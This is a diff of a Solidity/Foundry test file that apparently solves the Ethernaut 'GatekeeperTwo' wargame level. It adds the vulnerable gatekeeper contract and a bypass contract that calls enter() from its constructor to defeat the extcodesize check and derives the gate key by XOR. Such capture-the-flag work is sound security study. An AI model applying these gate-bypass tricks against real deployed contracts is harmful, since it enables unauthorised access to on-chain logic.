@@ -19,17 +19,52 @@ contract TestBypasser is Test {
         pass.bypass{gas: 3 * 8191}();
     }
 
-    function testCompl() public pure {
+    function testCompl() public {
+        GatekeeperTwo keeper = new GatekeeperTwo();
+        new GatekeeperTwoBypass(keeper);
+    }
+}
+
+contract GatekeeperTwoBypass {
+    constructor(GatekeeperTwo keeperTwo) {
         uint64 value = uint64(
-            bytes8(
-                keccak256(
-                    abi.encodePacked(0x38C5479620f6C2f29677F04d89E356cF6E75CFde)
-                )
-            )
+            bytes8(keccak256(abi.encodePacked(address(this))))
         );
-        uint64 cmp = uint64(~bytes8(value));
-        uint64 max = value ^ cmp;
-        console.log("VAL CMP MAX", value, cmp, max);
+        uint64 _gateKey = uint64(~bytes8(value));
+        keeperTwo.enter(bytes8(_gateKey));
+    }
+}
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(
+            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
+                uint64(_gateKey) ==
+                type(uint64).max
+        );
+        _;
+    }
+
+    function enter(
+        bytes8 _gateKey
+    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
     }
 }
 
@@ -118,25 +153,5 @@ contract GatekeeperOne {
     ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
-    }
-}
-
-contract GatekeeperOneSim {
-    address public entrant;
-    uint256 two;
-    modifier gateOne() {
-        require(msg.sender != tx.origin);
-        _;
-    }
-
-    modifier gateTwo() {
-        two = gasleft();
-        require(gasleft() % 8191 >= 0);
-        _;
-    }
-
-    function simulate() public gateOne gateTwo returns (uint256 gasUsed) {
-        // Simulating up to the point where gateTwo would be reached
-        return two; // Return the gas consumed so far
     }
 }
